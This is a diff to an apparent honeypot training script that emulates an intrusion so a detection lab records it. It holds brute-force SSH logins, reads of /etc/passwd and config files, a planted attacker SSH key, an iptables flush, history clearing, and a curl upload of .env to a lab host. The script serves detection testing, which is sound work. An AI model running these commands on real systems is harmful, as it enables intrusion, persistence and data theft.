@@ -12,6 +12,8 @@ echo '### web probes'
 curl -fsS -A gobuster/training "http://$WEB/.env" > "$OUT/web.env"
 curl -sS -A sqlmap/training "http://$WEB/api/customers?id=1%20union%20select%201" >/dev/null
 curl -sS -A nikto/training "http://$WEB/admin" >/dev/null
+# TLS handshake so Suricata records a JA3 fingerprint
+curl -ksS -A sqlmap/training "https://$WEB/" >/dev/null || true
 for p in bad1 bad2 bad3 bad4 bad5; do
   sshpass -p "$p" ssh "${SSH[@]}" root@"$WEB" true 2>/dev/null || true
 done
@@ -31,6 +33,20 @@ git -C "$OUT/repo" show HEAD~1:deploy_key > "$OUT/deploy_key"
 chmod 600 "$OUT/deploy_key"
 # deploy's home is recreated empty on login (new Cowrie user); read the shared backup dir.
 ssh "${SSH[@]}" -o IdentitiesOnly=yes -i "$OUT/deploy_key" deploy@"$DB" 'hostname; cat /var/backups/customers.csv'
+echo '### deeper discovery, persistence, defense evasion'
+# One session exercising a broad set of post-exploitation techniques. Ends with `true`
+# so a "command not found" inside Cowrie does not trip set -e.
+sshpass -p 123456 ssh "${SSH[@]}" root@"$WEB" '
+  whoami; groups; last
+  ip addr show; ip route; cat /etc/resolv.conf
+  netstat -tlnp; ss -tlnp
+  getent passwd; cat /etc/passwd
+  crontab -l; cat /etc/crontab
+  cat /var/www/html/config.php
+  echo "ssh-ed25519 AAAAattacker mirage" >> /root/.ssh/authorized_keys
+  sudo -n id
+  iptables -F
+  history -c; true' || true
 echo '### attempted transfer / exfiltration (emulated)'
 sshpass -p 123456 ssh "${SSH[@]}" root@"$WEB" 'wget http://10.66.0.50/training.txt; curl -T /var/www/.env http://10.66.0.50/upload' || true
 echo '### SMB discovery'
